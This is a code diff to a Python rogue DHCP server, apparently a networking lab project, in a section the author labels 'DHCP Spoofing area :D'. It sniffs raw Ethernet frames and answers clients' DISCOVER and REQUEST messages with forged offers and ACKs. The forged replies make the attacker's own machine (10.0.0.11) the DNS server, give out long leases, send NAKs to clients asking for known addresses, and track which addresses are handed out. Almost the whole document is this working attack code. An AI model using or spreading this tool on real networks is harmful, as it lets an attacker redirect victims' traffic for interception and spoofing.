@@ -30,8 +30,8 @@ DHCP_UNICAST_MSG = 0x0000
 DHCP_BROADCAST_MSG = 0x8000
 
 MY_IP = '10.0.0.11'
-DNS_IP = '0.0.0.0'
-ROUTER_IP = '10.0.0.11'
+DNS_IP = '10.0.0.11'
+ROUTER_IP = '10.0.0.1'
 
 
 def isIP(eth_packet: tuple) -> bool:
@@ -105,12 +105,27 @@ def getDHCPMessageType(opts: list) -> int:
     return 0
 
 
+def getDHCPOption(opts: list, code: int) -> any:
+    for v in opts:
+        if v[0] == code:
+            return v[2]
+
+
 def isMe(opts: list) -> bool:
     myByteIp = socket.inet_aton(MY_IP)
     for v in opts:
         if v[0] == 54:
             return v[2] == myByteIp
 
+    return False
+
+
+def hasRequestedIP(opts: list) -> bool:
+    for v in opts:
+        if v[0] == 50 and \
+            socket.inet_ntoa(v[2]) not in offeredIPs and \
+                socket.inet_ntoa(v[2]) not in usedIPs:
+            return True
     return False
 
 
@@ -145,6 +160,39 @@ def decodeDHCP(udp_data: bytes) -> (dict, bytes):
 # ------------------------------------------------------------------------
 # DHCP Spoofing area :D
 # ------------------------------------------------------------------------
+
+
+offeredIPs = []  # ip as a string
+usedIPs = []  # ip as a string
+usedSuffixes = []
+maxIP = 126
+
+
+def getLooseIP() -> str:
+    lastIp = 1
+    ip = 2
+
+    if len(usedSuffixes):
+        ips = usedSuffixes
+        ips.sort()
+        for v in ips:
+            if v >= maxIP:
+                return ''
+            if v >= lastIp+1:
+                ip = lastIp+1
+                break
+            else:
+                lastIp = v
+
+    return '10.0.0.' + str(ip)
+
+
+def addUsedSuffix(ip: str) -> None:
+    ipSplit = ip.split('.')
+    ipSuffix = int(ipSplit[len(ipSplit)-1])
+
+    if not ipSuffix in usedSuffixes:
+        usedSuffixes.append(ipSuffix)
 
 
 def getZeroList(s: int):
@@ -192,20 +240,21 @@ def getSpoofedDHCP(props: dict) -> bytes:
         opts += struct.pack('!BB4s', 54, 4, props['opt_server_id'])
 
     # end opts
-    opts += struct.pack('!B', 0xff)
+    opts += struct.pack('!B15x', 0xff)
 
     return dhcp + opts
 
 
 def getSpoofedDHCPOffer(data) -> bytes:
     client_mac = data['eth'][1]
+    offeredIP = getLooseIP()
 
     dhcpProps = {
         'op': DHCP_OP_REPLY,
         'xid': data['dhcp']['xid'],
         'flags': data['dhcp']['flags'],
         'ciaddr': socket.inet_aton('0.0.0.0'),
-        'yiaddr': socket.inet_aton('10.0.0.12'),
+        'yiaddr': socket.inet_aton(offeredIP),
         'siaddr': socket.inet_aton(MY_IP),
         'giaddr': socket.inet_aton(ROUTER_IP),
         'client_mac': client_mac,
@@ -213,57 +262,23 @@ def getSpoofedDHCPOffer(data) -> bytes:
         'opt_subnet_mask': socket.inet_aton('255.255.255.0'),
         'opt_router_ip': socket.inet_aton(ROUTER_IP),
         'opt_dns_server': socket.inet_aton(DNS_IP),
-        'opt_lease': 30,
+        'opt_lease': 36000,
         'opt_server_id': socket.inet_aton(MY_IP),
     }
 
-    return getSpoofedDHCP(dhcpProps)
+    return (getSpoofedDHCP(dhcpProps), offeredIP)
 
 
 def sendDHCPOfferSpoofed(sock: socket, data) -> None:
-    offer = getSpoofedDHCPOffer(data)
+    (offer, offeredIP) = getSpoofedDHCPOffer(data)
     dhcpFlags = data['dhcp']['flags']
 
-    dest_mac = data['eth'][1]
-    src_mac = data['eth'][0]
-    eht_h = struct.pack(
-        '!6s6sH',
-        dest_mac,
-        b'\x00\x00\x00\xaa\x00\x03',
-        ETH_P_IP,
-    )
-
-    ipVersion = 4
-    ipHlen = 5
-    ipTOS = 0
-    ipTotLen = 0
-    ipID = 1
-    ipFrag = 0
-    ipTTL = 255
-    ipProto = socket.IPPROTO_UDP
-    ipChecksum = 0
-    ipSaddr = socket.inet_aton('10.0.0.11')
-    ipHlenVersion = (ipVersion << 4) + ipHlen
-
+    ipDaddr = '255.255.255.255'
     if dhcpFlags == DHCP_UNICAST_MSG:
-        ipDaddr = '10.0.0.12'
-    else:
-        ipDaddr = '255.255.255.255'
-    ipDaddr = socket.inet_aton(ipDaddr)
+        ipDaddr = offeredIP
 
-    ip_h = struct.pack(
-        '!BBHHHBBH4s4s',
-        ipHlenVersion,
-        ipTOS,
-        ipTotLen,
-        ipID,
-        ipFrag,
-        ipTTL,
-        ipProto,
-        ipChecksum,
-        ipSaddr,
-        ipDaddr
-    )
+    ipDaddr = socket.inet_aton(ipDaddr)
+    ipSaddr = socket.inet_aton(MY_IP)
 
     udpSport = 67
     udpDport = 68
@@ -284,46 +299,118 @@ def sendDHCPOfferSpoofed(sock: socket, data) -> None:
     udpChecksum = computeChecksum(pseudo_h+udp_h+offer)
     udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
 
+    ipVersion = 4
+    ipHlen = 5
+    ipTOS = 0
+    ipTotLen = 0
+    ipID = 1
+    ipFrag = 0
+    ipTTL = 255
+    ipProto = socket.IPPROTO_UDP
+    ipChecksum = 0
+    ipHlenVersion = (ipVersion << 4) + ipHlen
+
+    ip_h = struct.pack(
+        '!BBHHHBBH4s4s',
+        ipHlenVersion,
+        ipTOS,
+        ipTotLen,
+        ipID,
+        ipFrag,
+        ipTTL,
+        ipProto,
+        ipChecksum,
+        ipSaddr,
+        ipDaddr
+    )
+
+    ipChecksum = computeChecksum(ip_h)
+    ip_h = struct.pack(
+        '!BBHHHBBH4s4s',
+        ipHlenVersion,
+        ipTOS,
+        ipTotLen,
+        ipID,
+        ipFrag,
+        ipTTL,
+        ipProto,
+        ipChecksum,
+        ipSaddr,
+        ipDaddr
+    )
+
+    dest_mac = data['eth'][1]
+    src_mac = data['eth'][0]
+    eht_h = struct.pack(
+        '!6s6sH',
+        dest_mac,
+        b'\x00\x00\x00\xaa\x00\x03',
+        ETH_P_IP,
+    )
+
     npacket = eht_h+ip_h+udp_h+offer
 
-    s.send(npacket)
+    sock.send(npacket)
+    if offeredIP not in offeredIPs:
+        offeredIPs.append(offeredIP)
 
 
-def getSpoofedDHCPAck(data) -> bytes:
+def getSpoofedDHCPAck(data, isNack: bool = False) -> bytes:
     client_mac = data['eth'][1]
+    yiaddr = getDHCPOption(data['dhcp']['opts'], 50)
 
     dhcpProps = {
         'op': DHCP_OP_REPLY,
         'xid': data['dhcp']['xid'],
         'flags': data['dhcp']['flags'],
         'ciaddr': socket.inet_aton('0.0.0.0'),
-        'yiaddr': socket.inet_aton('10.0.0.12'),
+        'yiaddr': yiaddr,
         'siaddr': socket.inet_aton(MY_IP),
         'giaddr': socket.inet_aton(ROUTER_IP),
         'client_mac': client_mac,
-        'opt_msg_type': DHCPACK,
+        'opt_msg_type': DHCPNAK if isNack else DHCPACK,
         'opt_subnet_mask': socket.inet_aton('255.255.255.0'),
         'opt_router_ip': socket.inet_aton(ROUTER_IP),
         'opt_dns_server': socket.inet_aton(DNS_IP),
-        'opt_lease': 30,
+        'opt_lease': 36000,
         'opt_server_id': socket.inet_aton(MY_IP),
     }
 
-    return getSpoofedDHCP(dhcpProps)
+    return (
+        getSpoofedDHCP(dhcpProps),
+        socket.inet_ntoa(yiaddr) if not isNack else None,
+    )
 
 
-def sendDHCPAckSpoofed(sock: socket, data) -> None:
-    offer = getSpoofedDHCPAck(data)
+def sendDHCPAckSpoofed(sock: socket, data, isNack: bool = False) -> None:
+    (ack, usedIP) = getSpoofedDHCPAck(data, isNack)
     dhcpFlags = data['dhcp']['flags']
 
-    dest_mac = data['eth'][1]
-    src_mac = data['eth'][0]
-    eht_h = struct.pack(
-        '!6s6sH',
-        dest_mac,
-        b'\x00\x00\x00\xaa\x00\x03',
-        ETH_P_IP,
+    ipDaddr = '255.255.255.255'
+    if dhcpFlags == DHCP_UNICAST_MSG:
+        ipDaddr = usedIP if usedIP else '255.255.255.255'
+
+    ipDaddr = socket.inet_aton(ipDaddr)
+    ipSaddr = socket.inet_aton(MY_IP)
+
+    udpSport = 67
+    udpDport = 68
+    udpLen = struct.calcsize('!HHHH')+len(ack)
+    udpChecksum = 0
+    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
+
+    pseudo_h = struct.pack(
+        '!4s4sBBH',
+        ipSaddr,
+        ipDaddr,
+        0,
+        socket.IPPROTO_UDP,
+        udpLen,
     )
+
+    # * get the checksum with pseudo header + udp header + dhcp offer packet
+    udpChecksum = computeChecksum(pseudo_h+udp_h+ack)
+    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
 
     ipVersion = 4
     ipHlen = 5
@@ -334,15 +421,7 @@ def sendDHCPAckSpoofed(sock: socket, data) -> None:
     ipTTL = 255
     ipProto = socket.IPPROTO_UDP
     ipChecksum = 0
-    ipSaddr = socket.inet_aton('10.0.0.11')
     ipHlenVersion = (ipVersion << 4) + ipHlen
-
-    if dhcpFlags == DHCP_UNICAST_MSG:
-        ipDaddr = '10.0.0.12'
-    else:
-        ipDaddr = '255.255.255.255'
-    ipDaddr = socket.inet_aton(ipDaddr)
-
     ip_h = struct.pack(
         '!BBHHHBBH4s4s',
         ipHlenVersion,
@@ -357,28 +436,36 @@ def sendDHCPAckSpoofed(sock: socket, data) -> None:
         ipDaddr
     )
 
-    udpSport = 67
-    udpDport = 68
-    udpLen = struct.calcsize('!HHHH')+len(offer)
-    udpChecksum = 0
-    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
-
-    pseudo_h = struct.pack(
-        '!4s4sBBH',
+    ipChecksum = computeChecksum(ip_h)
+    ip_h = struct.pack(
+        '!BBHHHBBH4s4s',
+        ipHlenVersion,
+        ipTOS,
+        ipTotLen,
+        ipID,
+        ipFrag,
+        ipTTL,
+        ipProto,
+        ipChecksum,
         ipSaddr,
-        ipDaddr,
-        0,
-        socket.IPPROTO_UDP,
-        udpLen,
+        ipDaddr
     )
 
-    # * get the checksum with pseudo header + udp header + dhcp offer packet
-    udpChecksum = computeChecksum(pseudo_h+udp_h+offer)
-    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)
+    dest_mac = data['eth'][1]
+    src_mac = data['eth'][0]
+    eht_h = struct.pack(
+        '!6s6sH',
+        dest_mac,
+        b'\x00\x00\x00\xaa\x00\x03',
+        ETH_P_IP,
+    )
 
-    npacket = eht_h+ip_h+udp_h+offer
+    npacket = eht_h+ip_h+udp_h+ack
 
-    s.send(npacket)
+    sock.send(npacket)
+    if usedIP and not usedIP in usedIPs:
+        addUsedSuffix(usedIP)
+        usedIPs.append(usedIP)
 
 
 # ------------------------------------------------------------------------
@@ -394,25 +481,25 @@ def spoof(s: socket) -> None:
         eth_data = packet[ETH_LEN:]
         eth = struct.unpack('!6s6sH', eth_header)
 
-        print('MAC src:', bytesToMac(eth[1]))
+        print('\nMAC src:', bytesToMac(eth[1]))
         print('MAC dst:', bytesToMac(eth[0]))
         print('eth type:', hex(eth[2]))
 
         if isIP(eth):
             (ip_s, ip_d, ip_p, ip_data) = decodeIP(eth_data)
-            print('\nIP Src:', ip_s)
+            print('IP Src:', ip_s)
             print('IP Dest:', ip_d)
             print('IP Proto:', ip_p)
 
             if isUDP(ip_p):
                 (psrc, pdst, plen, udp_data) = decodeUDP(ip_data)
-                print('\nUDP p_src:', psrc)
+                print('UDP p_src:', psrc)
                 print('UDP p_dst:', pdst)
                 print('UDP len:', plen)
 
                 if isDHCP(psrc, pdst):
                     (dhcp, dhcp_data) = decodeDHCP(udp_data)
-                    print('\nDHCP:', dhcp)
+                    # print('DHCP:', dhcp)
                     print('DHCP xid', hex(dhcp['xid']))
 
                     dhcpToSpoof = {
@@ -431,13 +518,21 @@ def spoof(s: socket) -> None:
                     msgType = getDHCPMessageType(dhcp['opts'])
                     print('DHCP Message Type', msgType)
 
+                    hasReqId = hasRequestedIP(dhcp['opts'])
+
                     if msgType == DHCPDISCOVER:
                         print('DHCP discover')
+                        if hasReqId:
+                            print('DHCP has Requested IP')
+                            sendDHCPAckSpoofed(s, dhcpToSpoof, True)
                         sendDHCPOfferSpoofed(s, dhcpToSpoof)
                     elif msgType == DHCPREQUEST:
                         print('DHCP request')
                         if isMe(dhcp['opts']):
-                            sendDHCPAckSpoofed(s, dhcpToSpoof)
+                            if hasReqId:
+                                sendDHCPAckSpoofed(s, dhcpToSpoof, True)
+                            else:
+                                sendDHCPAckSpoofed(s, dhcpToSpoof)
                     else:
                         print('Don\'t know this one :/')
 
@@ -445,8 +540,10 @@ def spoof(s: socket) -> None:
 if __name__ == "__main__":
     print('running...')
     try:
-        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
-                          socket.ntohs(ETH_P_ALL))
+        s = socket.socket(
+            socket.AF_PACKET,
+            socket.SOCK_RAW,
+            socket.ntohs(ETH_P_ALL))
     except OSError as e:
         print('error creating the sniff socket', e)
         sys.exit(1)
